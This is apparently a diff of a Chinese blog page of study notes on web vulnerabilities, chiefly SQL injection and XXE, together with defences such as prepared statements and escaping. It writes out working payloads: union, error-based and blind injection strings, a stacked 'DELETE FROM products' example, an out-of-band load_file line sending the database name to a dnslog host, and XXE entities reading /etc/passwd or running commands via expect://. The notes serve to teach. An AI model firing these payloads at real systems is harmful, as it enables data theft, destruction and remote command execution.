@@ -87,205 +87,196 @@
   <div class="article-content">
     <div class="entry">
       
-        <!-- toc  -->
-
-<h1 id="常见的漏洞及原理"><a href="#常见的漏洞及原理" class="headerlink" title="常见的漏洞及原理"></a>常见的漏洞及原理</h1><h2 id="注入类"><a href="#注入类" class="headerlink" title="注入类"></a>注入类</h2><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>sql注入的原理：对用户提交的数据没有进行处理，会导致和后台执行的sql语句
-
-</p><p>进行拼接，导致sql注入。</p><p></p>
+        <p><a name="df726c02"></a></p>
+<h1 id="常见的漏洞及原理"><a href="#常见的漏洞及原理" class="headerlink" title="常见的漏洞及原理"></a>常见的漏洞及原理</h1><p><a name="6f8e7fd7"></a></p>
+<h2 id="注入类"><a href="#注入类" class="headerlink" title="注入类"></a>注入类</h2><p><a name="4be321f0"></a></p>
+<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>sql注入的原理：对用户提交的数据没有进行处理，会导致和后台执行的sql语句 <br>进行拼接，导致sql注入。</p>
 <p><strong>sql注入的条件</strong>：</p>
 <ol>
-<li><p>我们传递给后端的参数是可以控制的</p>
-</li>
-<li><p>参数内容会被带入到数据库查询</p>
-</li>
+<li> 我们传递给后端的参数是可以控制的 </li>
+<li> 参数内容会被带入到数据库查询 </li>
 </ol>
 <p><strong>判断是否存在SQL注入</strong></p>
 <ol>
-<li><p>使用and 1=1 和 and 1 =2 看看页面是否一样</p>
-</li>
-<li><p>使用id =3 -1 看看页面是否一样</p>
-</li>
-<li><p>使用 ‘(单引号) 、“（双引号）看看是否报错</p>
-</li>
+<li> 使用and 1=1 和 and 1 =2 看看页面是否一样 </li>
+<li> 使用id =3 -1 看看页面是否一样 </li>
+<li> 使用 ‘(单引号) 、“（双引号）看看是否报错 </li>
 </ol>
 <p><em>MySQL(补充知识)</em></p>
 <ul>
 <li>管理命令</li>
 </ul>
-<p>show databases;show tables
-
-</p><p>使用那个数据库：user xxx(数据库名)</p>
+<p>show databases;show tables <br>使用那个数据库：user xxx(数据库名)</p>
 <p>显示数据表的属性、属性信息、主键信息的值等其他信息：showcolumns form 数据表<br>order by 语句：用来对查询的结果进行排序，后面跟上的字段或者数字表示根据那一排来进行排序，如果超过结果，则会进行报错，因此就可以判断出原本查询中涉及几个字段。</p>
-<p></p>
+<p><a name="360f02c0"></a></p>
+<h4 id="sql注入的类型"><a href="#sql注入的类型" class="headerlink" title="sql注入的类型"></a>sql注入的类型</h4><p><a name="eef42a6d"></a></p>
+<h5 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h5><p>前提条件：提交完数据之后，可以在前台看见一个提交后的的显示，这个展示的数据就叫做展示位。<br></p>
+<p>eg：select *from user where id =1</p>
+<p>可以使用order by 语句判断出表有几列</p>
+<p>select *from user where id =1 order by 从1开始增加的数字</p>
+<p>+———–+————–+—————+—————–+</p>
+<p>| runoob_id | runoob_title | runoob_author | submission_date |</p>
+<p>+———–+————–+—————+—————–+|</p>
+<p>|      1       | 学习 PHP | 菜鸟教程| 2022-12-07|</p>
+<p>+———–+————–+—————+—————–+</p>
+<p>可以看出现在这个表有四列，也就是当 select *from user where id=1 order by 5 时 程序会报错：ERROR 1054 (42S22): Unknowncolumn ‘5’ in ‘order clause’判断出列数以后，可以获取展示位的位置</p>
+<p>select * from user where id =-1 union select 1;<br>select 后面加数字，就会直接显示出来，这样在前台显示的数字，就是一个展示位,得到展示位之后，可以首先判断数据库的类型、版本等信息</p>
+<p>select * from user where id =-1 union select 1;database();<br>因为有时候页面可能只会显示一位信息，所以这里需要给一个根本查不出数据的值，以便将后面的信息显示出来.<br>查询表名<br>在mysql5.0以上的版本中加入了information_schema这个系统自带库，可以看到里面用数据库可以查询到表名，用表名可以查询到字段，我们可以加以利用。</p>
+<p>select * from user where ID = -1 union select 1,table_name,3,4  from information_schema.tables where table_schema=’库名’limit 0,1–+ 和–(空格是为了注释后面的语句)</p>
+<p>查询字段<br>information_schema.columns存放着字段名和表名的对应</p>
+<p>构造语句：union select 1,column_name,3,4 from information_schema.columns where table_name=’表名’<br>有字段有表名，就可以直接构造 select 字段 from 表名</p>
+<p><a name="a47d8d94"></a></p>
+<h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><p>在SQL注入攻击过程中，服务器开启了错误回显，页面会返回错误信息，</p>
+<p>利用报错函数获取数据库数据</p>
+<p><strong>报错语句</strong></p>
+<p>updatexml()报错:updatexml():updatexml(XML_document, XPath_string,</p>
+<p>new_value);</p>
+<p>简单的来说就是 update(目标xml类容，xml文档路径，更新的内容)我们在xml文档路径的位置写入了子查询，和特殊字符拼接在一起，因为不符合输入路径规则然后报错，先执行了子查询我们可以得到库名。0x7e是16进制里面的“~”，是一个特殊符号，不符合路径规则报错</p>
 
-<h4 id="sql注入的类型"><a href="#sql注入的类型" class="headerlink" title="sql注入的类型"></a>sql注入的类型</h4><h5 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h5><br>
-    前提条件：提交完数据之后，可以在前台看见一个提交后的的显示，这个
+<p>eg:</p>
+<p><code>select \* from aaa where id=1 and updatexml(1,concat(0x7e,(select user()),1)</code></p>
+<p><em>0x7e是一个~符号</em></p>
+<p><a name="133b38a9"></a></p>
+<h6 id="1-extractvalue-报错"><a href="#1-extractvalue-报错" class="headerlink" title="1. extractvalue()报错"></a>1. extractvalue()报错</h6><p> extractvalue()作用:对XML文档进行查询，相当于在HTML文件中用标签查找元</p>
+<p>素。</p>
+<pre><code>语法: extractvalue(XML\_document, XPath\_string )
 
-<pre><code>展示的数据就叫做展示位。&lt;/br&gt;
+参数1: XML\_document是String格式，为XML文档对象的名称
+
+参数2: XPath\_string (Xpath格式的字符串)，注入时可操作的地方
+
+参数1: XML\_document是String格式，为XML文档对象的名称
+
+参数2: XPath\_string (Xpath格式的字符串)，注入时可操作的地方
+
+eg:select extractvalue(1,concat(’ ~ &#39;,user()));
+
+之后的可以和联合注入一样
 </code></pre>
-<br>
+<p><a name="ad74199a"></a></p>
+<h6 id="2-floor报错-主键冲突（重复）"><a href="#2-floor报错-主键冲突（重复）" class="headerlink" title="2. floor报错(主键冲突（重复）)"></a>2. floor报错(主键冲突（重复）)</h6><pre><code>主键重复方式的报错注入利用的函数有： floor() + rand() + group() + count()
 
-<pre><code>eg：select \*from user where id =1
+利用 select count(\*),(floor(rand(0)\*2)) x from users group by x这个相对固定的语句格式，导致的数据库报错
 
-可以使用order by 语句判断出表有几列
+理解rand函数:rand()是一个随机函数，通过一个固定的随机数的种子0之后，
 
-select \*from user where id =1 order by 从1开始增加的数字
+产生大于等于0小于1的伪随机序列&lt;br /&gt;    理解floor(rand(0)\*2)
+
+floor() 函数的作用就是返回小于等于括号内该值的最大整数，也就是取整。
+
+floor(rand(0)\*2) 得到伪随机数列011011,因为使用了固定的随机数种子0，他每次产生的随机数列都是相同的0 1 1 0 1 1的顺序。&lt;br /&gt;    理解group by:group by进行分组排序相同名字合并&lt;br /&gt;    理解count()函数:对a中的重复性的数据进行了整合，然后计数，后面的x就是每一类的数量。
 </code></pre>
-<br>
-    eg：
+<p><a name="eae5442e"></a></p>
+<h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><p><a name="328a1cab"></a></p>
+<h6 id="1-布尔注入"><a href="#1-布尔注入" class="headerlink" title="1.  布尔注入"></a>1.  布尔注入</h6><pre><code>sql时间盲注指的是：页面没有回显，使用布尔盲注，利用页面是否正确响应看是否存在sql注入。
 
-<pre><code>+-----------+--------------+---------------+-----------------+
+注入流程
 
-| runoob\_id | runoob\_title | runoob\_author | submission\_date |
+    第一步：判断是否可以注入，和以前的方式一样，使用‘ 或者 “进行判断
 
-+-----------+--------------+---------------+-----------------+|
+    第二步，同样的，使用order by 判断列数
 
-|      1       | 学习 PHP | 菜鸟教程| 2022-12-07|
+    第三步：就要构造语句来进行猜解数据长度和库名：
 
-+-----------+--------------+---------------+-----------------+
+    eg： and length(database())=8--+
 
-可以看出现在这个表有四列，也就是当 select \*from user where id=1 order by 5 时 程序会报错：ERROR 1054 (42S22): Unknowncolumn &#39;5&#39; in &#39;order clause&#39;判断出列数以后，可以获取展示位的位置
-
-select \* from user where id =-1 union select 1;
-select 后面加数字，就会直接显示出来，这样在前台显示的数字，就是一个展示位,得到展示位之后，可以首先判断数据库的类型、版本等信息
-
-select \* from user where id =-1 union select 1;database();
-因为有时候页面可能只会显示一位信息，所以这里需要给一个根本查不出数据的值，以便将后面的信息显示出来.
-查询表名
-在mysql5.0以上的版本中加入了information\_schema这个系统自带库，可以看到里面用数据库可以查询到表名，用表名可以查询到字段，我们可以加以利用。
-
-select * from user where ID = -1 union select 1,table_name,3,4  from information_schema.tables where table_schema=’库名’limit 0,1--+ 和--(空格是为了注释后面的语句)
-
-查询字段
-
-information\_schema.columns存放着字段名和表名的对应
-
-构造语句：union select 1,column\_name,3,4 from information\_schema.columns where table\_name=’表名’
-有字段有表名，就可以直接构造 select 字段 from 表名
+    ?id=1&#39; and (ascii(substr(database(),1,1)) &gt;100) --+
 </code></pre>
-<h5 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h5><pre><code>在SQL注入攻击过程中，服务器开启了错误回显，页面会返回错误信息，
+<p><a name="bbc335e0"></a></p>
+<h6 id="2-时间盲注"><a href="#2-时间盲注" class="headerlink" title="2.  时间盲注"></a>2.  时间盲注</h6><pre><code>sql时间盲注指的是：页面没有回显，使用时间盲注，利用页面响应的时间看是否存在sql注入。
 
-利用报错函数获取数据库数据
+注入过程
 
-**报错语句**
+    id=1&#39; and if(length(database())&gt;1,sleep(2),0) --+
 
-updatexml()报错:updatexml():updatexml(XML\_document, XPath\_string,
+    增加1值来猜库名的长度
 
-new_value);
+    id=1&#39; and if(ascii(substr(database(),1,1))&gt;114,sleep(2),0) --+
 
-&lt;p&gt;简单的来说就是 update(目标xml类容，xml文档路径，更新的内容)我们在xml文档路径的位置写入了子查询，和特殊字符拼接在一起，因为不符合输入路径规则然后报错，先执行了子查询我们可以得到库名。0x7e是16进制里面的“~”，是一个特殊符号，不符合路径规则报错&lt;/p&gt;
+    增加1值，对照ascii表查询库名
 
-eg:
+    id=1’ and if(ascii(substr((select table\_name from
 
-```select \* from aaa where id=1 and updatexml(1,concat(0x7e,(select user()),1)```
+    information\_schema.tables where table\_schema=&#39;security&#39; limit 0,1),1,1))&gt;101,sleep(1),0)--+
 
-*0x7e是一个~符号*
+    增加1值，对照ascii表查询表名
+
+    id=1&#39; and if(ascii(substr((select column\_name from
+
+    information\_schema.columns where table\_schema=database()
+
+    and table\_name=&#39;emails&#39; limit 0,1),1,1))&gt;104,sleep(1),0)--+
+
+    增加1值，对照ascii表查询列名
+
+    id=1&#39; and if(ascii(substr((select id from emails limit
+
+    0,1),1,1))&gt;49,sleep(1),0)--+
+
+    根据表名和列名进行暴值
 </code></pre>
-<h6 id="1-extractvalue-报错"><a href="#1-extractvalue-报错" class="headerlink" title="1. extractvalue()报错"></a>1. extractvalue()报错</h6><pre><code> extractvalue()作用:对XML文档进行查询，相当于在HTML文件中用标签查找元
-
-素。
-
-    语法: extractvalue(XML\_document, XPath\_string )
-
-    参数1: XML\_document是String格式，为XML文档对象的名称
-
-    参数2: XPath\_string (Xpath格式的字符串)，注入时可操作的地方
-
-    参数1: XML\_document是String格式，为XML文档对象的名称
-
-    参数2: XPath\_string (Xpath格式的字符串)，注入时可操作的地方
-
-    eg:select extractvalue(1,concat(’ ~ &#39;,user()));
-
-    之后的可以和联合注入一样
-</code></pre>
-<h6 id="2-floor报错-主键冲突（重复）"><a href="#2-floor报错-主键冲突（重复）" class="headerlink" title="2. floor报错(主键冲突（重复）)"></a>2. floor报错(主键冲突（重复）)</h6><pre><code>    主键重复方式的报错注入利用的函数有： floor() + rand() + group() + count()
-
-    利用 select count(\*),(floor(rand(0)\*2)) x from users group by x这个相对固定的语句格式，导致的数据库报错
-
-    理解rand函数:rand()是一个随机函数，通过一个固定的随机数的种子0之后，
-
-    产生大于等于0小于1的伪随机序列
-    理解floor(rand(0)\*2)
-
-    floor() 函数的作用就是返回小于等于括号内该值的最大整数，也就是取整。
-
-    floor(rand(0)\*2) 得到伪随机数列011011,因为使用了固定的随机数种子0，他每次产生的随机数列都是相同的0 1 1 0 1 1的顺序。
-    理解group by:group by进行分组排序相同名字合并
-    理解count()函数:对a中的重复性的数据进行了整合，然后计数，后面的x就是每一类的数量。
-</code></pre>
-<h5 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h5><h6 id="1-布尔注入"><a href="#1-布尔注入" class="headerlink" title="1.  布尔注入"></a>1.  布尔注入</h6><pre><code>    sql时间盲注指的是：页面没有回显，使用布尔盲注，利用页面是否正确响应看是否存在sql注入。
-
-    注入流程
-
-        第一步：判断是否可以注入，和以前的方式一样，使用‘ 或者 “进行判断
-
-        第二步，同样的，使用order by 判断列数
-
-        第三步：就要构造语句来进行猜解数据长度和库名：
-
-        eg： and length(database())=8--+
-
-        ?id=1&#39; and (ascii(substr(database(),1,1)) &gt;100) --+
-</code></pre>
-<h6 id="2-时间盲注"><a href="#2-时间盲注" class="headerlink" title="2.  时间盲注"></a>2.  时间盲注</h6><pre><code>    sql时间盲注指的是：页面没有回显，使用时间盲注，利用页面响应的时间看是否存在sql注入。
-
-    注入过程
-
-        id=1&#39; and if(length(database())&gt;1,sleep(2),0) --+
-
-        增加1值来猜库名的长度
-
-        id=1&#39; and if(ascii(substr(database(),1,1))&gt;114,sleep(2),0) --+
-
-        增加1值，对照ascii表查询库名
-
-        id=1’ and if(ascii(substr((select table\_name from
-
-        information\_schema.tables where table\_schema=&#39;security&#39; limit 0,1),1,1))&gt;101,sleep(1),0)--+
-
-        增加1值，对照ascii表查询表名
-
-        id=1&#39; and if(ascii(substr((select column\_name from
-
-        information\_schema.columns where table\_schema=database()
-
-        and table\_name=&#39;emails&#39; limit 0,1),1,1))&gt;104,sleep(1),0)--+
-
-        增加1值，对照ascii表查询列名
-
-        id=1&#39; and if(ascii(substr((select id from emails limit
-
-        0,1),1,1))&gt;49,sleep(1),0)--+
-
-        根据表名和列名进行暴值
-</code></pre>
+<p><a name="fa662c87"></a></p>
 <h5 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h5><p>原理：在SQL语句中，语句的结束都是以<code>;</code>结尾，但是如果我们在<code>;</code>后面再加上一条SQL语句，两条语句会一起执行吗？这也就是造成堆叠注入的原因了区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。例如以下这个例子。</p>
 <p>用户输入：1; DELETE FROM products服务器端生成的sql语句为：</p>
 <p>（因未对输入的参数进行过滤）<code>Select \* from products where productid=1;DELETE FROM products</code></p>
 <p>当执行查询后，第一条显示查询信息，第二条则将整个表进行删除。<br>可以用sqlib-13 来作为演示</p>
-<p>id=1’ and load_file(concat(“\\“,(database()),”.zt5cka.dnslog.cn\1.txt”)) – -</p>
+<p>id=1’ and load_file(concat(“\“,(database()),”.zt5cka.dnslog.cn\1.txt”)) – -</p>
+<p><a name="adfd1a04"></a></p>
 <h5 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h5><p>原理：用户向数据库里存入恶意的数据，在数据被插入到数据库之前，肯定会对数据库进行转义处理，但用户输入的数据的内容肯定是一点摸样也不会变的存进数据库里，而一般都默认为数据库里的信息都是安全的，查询的时候不会进行处理，所以当用户的恶意数据被web程序调用的时候就有可能出发SQL注入。</p>
-<h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><pre><code>    &quot;....&quot;
+<p><a name="5c3d400d"></a></p>
+<h5 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h5><pre><code>&quot;....&quot;
 </code></pre>
-<h5 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h5><pre><code>    &quot;....&quot;
+<p><a name="249d781e"></a></p>
+<h5 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h5><pre><code>&quot;....&quot;
 </code></pre>
-<h4 id="sql注入的防御"><a href="#sql注入的防御" class="headerlink" title="sql注入的防御"></a>sql注入的防御</h4><h6 id="1-采用预编译技术"><a href="#1-采用预编译技术" class="headerlink" title="1.  采用预编译技术"></a>1.  采用预编译技术</h6><p>预编译技术在创建的时候就已经将指定的SQL语句发送给数据库，而攻击者只是在修改用户提交的变量，而无法对数据库语句进行修改</p>
-<h6 id="2-严格控制数据类型"><a href="#2-严格控制数据类型" class="headerlink" title="2.  严格控制数据类型"></a>2.  严格控制数据类型</h6><p>在写代码的时候，需要对用户提交的数据类型进行严格限制，像是java c这种强类型语言，是不会存在数字型注入的，因为定义好类型之后，当输入string类型时就会报错，而像php、asp这种没有强调数据处理类型的语言就会容易出现问题</p>
+<p><a name="98b78bc9"></a></p>
+<h4 id="sql注入的防御"><a href="#sql注入的防御" class="headerlink" title="sql注入的防御"></a>sql注入的防御</h4><p><a name="65b6fafb"></a></p>
+<h6 id="1-采用预编译技术"><a href="#1-采用预编译技术" class="headerlink" title="1.  采用预编译技术"></a>1.  采用预编译技术</h6><p>预编译技术在创建的时候就已经将指定的SQL语句发送给数据库，而攻击者只是在修改用户提交的变量，而无法对数据库语句进行修改</p>
+<p><a name="76ef4ae4"></a></p>
+<h6 id="2-严格控制数据类型"><a href="#2-严格控制数据类型" class="headerlink" title="2.  严格控制数据类型"></a>2.  严格控制数据类型</h6><p>在写代码的时候，需要对用户提交的数据类型进行严格限制，像是java c这种强类型语言，是不会存在数字型注入的，因为定义好类型之后，当输入string类型时就会报错，而像php、asp这种没有强调数据处理类型的语言就会容易出现问题</p>
+<p><a name="26eac417"></a></p>
 <h6 id="对特殊字符转义"><a href="#对特殊字符转义" class="headerlink" title="对特殊字符转义"></a>对特殊字符转义</h6><p>数字型注入可以通过检查数据类型防止，但是字符型不可以，那么怎么办呢，最好的办法就是对特殊的字符进行转义了。比如在MySQL中我们可以对” ‘ “进行转义，这样就防止了一些恶意攻击者来闭合语句。当然我们也可以通过一些安全函数来转义特殊字符。如addslashes（）等，但是这些函数并非一劳永逸，攻击者还可以通过一些特殊的方式绕过。</p>
-<h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><h2 id="CRLF"><a href="#CRLF" class="headerlink" title="CRLF"></a>CRLF</h2><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><h2 id="json劫持"><a href="#json劫持" class="headerlink" title="json劫持"></a>json劫持</h2><pre><code>用户可以构造一个可以恶意获取信息的json页面，诱导用户点击，从而获取用的
-</code></pre>
-<h2 id="敏感信息"><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h2><pre><code>敏感操作:
-
-    增加
-
-    查询
-
-    修改
-
-    删除
-</code></pre>
-<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><h2 id="xxe漏洞"><a href="#xxe漏洞" class="headerlink" title="xxe漏洞"></a>xxe漏洞</h2><h2 id="应用类"><a href="#应用类" class="headerlink" title="应用类"></a>应用类</h2><h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><h2 id="dos攻击"><a href="#dos攻击" class="headerlink" title="dos攻击"></a>dos攻击</h2><h2 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h2>
+<p><a name="ambta"></a></p>
+<h3 id="XXE注入"><a href="#XXE注入" class="headerlink" title="XXE注入"></a>XXE注入</h3><p>xxe注入全称：xml external  entity  外部实体<br><a name="YwRzr"></a></p>
+<h4 id="什么是xml"><a href="#什么是xml" class="headerlink" title="什么是xml"></a>什么是xml</h4><p>XML全称“可扩展标记语言”（extensible markup language），XML是一种用于存储和传输数据的语言。与HTML一样，XML使用标签和数据的树状结构。但不同的是，XML不使用预定义标记，因此可以为标记指定描述数据的名称。由于json的出现，xml的受欢迎程度大大下降。<strong>XML 被设计用来传输和存储数据，不用于表现和展示数据，HTML 则用来表现数据。</strong></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">site</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>RUNOOB<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://www.runoob.com<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">logo</span>&gt;</span>runoob-logo.png<span class="tag">&lt;/<span class="name">logo</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">desc</span>&gt;</span>编程学习网站<span class="tag">&lt;/<span class="name">desc</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">site</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong><name>、<url>、<logo>、<desc></desc></logo></url></name></strong> 分别为标签，标签内包含了要传递的信息。<br>标签必须成对出现，有开始标签就需要有结束标签，例如：</p>
+<ul>
+<li>开始标签：**<name>**</name></li>
+<li>结束标签：****<br><a name="MeoYy"></a><h4 id="xml的用途"><a href="#xml的用途" class="headerlink" title="xml的用途"></a>xml的用途</h4></li>
+</ul>
+<p>1.把数据从html中分离，主要是在网页里方便动态的修改数据<br>2.作为数据传输的载体，可以更方便的数据分享、传输。<br><a name="BMTaX"></a></p>
+<h4 id="什么是DTD"><a href="#什么是DTD" class="headerlink" title="什么是DTD"></a>什么是DTD</h4><p>DTD：dockment type definition  文档类型定义，用来定义xml文档的结构。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">note</span> (<span class="keyword">to</span>,<span class="keyword">from</span>,<span class="keyword">heading</span>,<span class="keyword">body</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">to</span> (<span class="keyword">#PCDATA</span>)&gt;</span>      &lt;!--每一个元素就是一个实体--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">from</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">heading</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="keyword">body</span> (<span class="keyword">#PCDATA</span>)&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">而您的应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">您还可以使用 DTD 来验证您自身的数据。</span></span><br><span class="line"><span class="comment">比如这个，就定义了XML的根元素必须是 note，以下的xml 必须按照这个格式来写--&gt;</span></span><br></pre></td></tr></table></figure>
+<p><a name="c8bc8"></a></p>
+<h4 id="什么是外部实体"><a href="#什么是外部实体" class="headerlink" title="什么是外部实体"></a>什么是外部实体</h4><p>顾名思义外部实体，就是从外部调用的元素</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">ext</span> <span class="keyword">SYSTEM</span><span class="string">&quot;http://test.com&quot;</span>&gt;</span> &lt;!--也可以通过文件来加载外部实体  file：///path/file</span></span><br><span class="line"><span class="meta">这也是产生XXE漏洞的原因--&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>
+<p><a name="HqXUU"></a></p>
+<h4 id="xxe漏洞概念"><a href="#xxe漏洞概念" class="headerlink" title="xxe漏洞概念"></a>xxe漏洞概念</h4><p>就是网站允许xml格式的数据输入和解析，通过引入外部实体的方式进行攻击。<br><a name="PKi5Z"></a></p>
+<h4 id="XXE漏洞危害"><a href="#XXE漏洞危害" class="headerlink" title="XXE漏洞危害"></a>XXE漏洞危害</h4><p>XXE漏洞根据有无回显可分为有回显XXE和Blind XXE，具体危害主要有：<br>**a.)**检索文件，其中定义了包含文件内容的外部实体，并在应用程序的响应中返回。<br><strong>b.）</strong>执行SSRF攻击，其中外部实体是基于后端系统的URL定义的，如：<br><!ENTITY xxe SYSTEM "http://127.0.0.1:8080" >探测端口；<br><!ENTITY xxe SYSTEM "expect://id" >执行命令；<br><strong>c.）</strong>无回显读取本地敏感文件(Blind OOB XXE)，敏感数据从应用<a target="_blank" rel="noopener" href="https://cloud.tencent.com/product/cvm?from=20065&from_column=20065">服务器</a>传输到攻击者的服务器上。<br>**d.)**通过Blind XXE错误消息检索数据是否存在，攻击者可以触发包含敏感数据的解析错误消息。<br>具体的攻击手段和场景在案例中说明。<br><a name="ngXeI"></a></p>
+<h4 id="实战案例"><a href="#实战案例" class="headerlink" title="实战案例"></a>实战案例</h4><p>有回显的读本地文件</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">note</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">hack</span><span class="string">&quot;test&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta"> ]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;hack;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以构造恶意的xml payload</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [</span></span><br><span class="line"><span class="meta"> <span class="meta">&lt;!ENTITY <span class="keyword">hack</span> <span class="keyword">SYSTEM</span>  <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span><span class="symbol">&amp;hack;</span><span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br></pre></td></tr></table></figure>
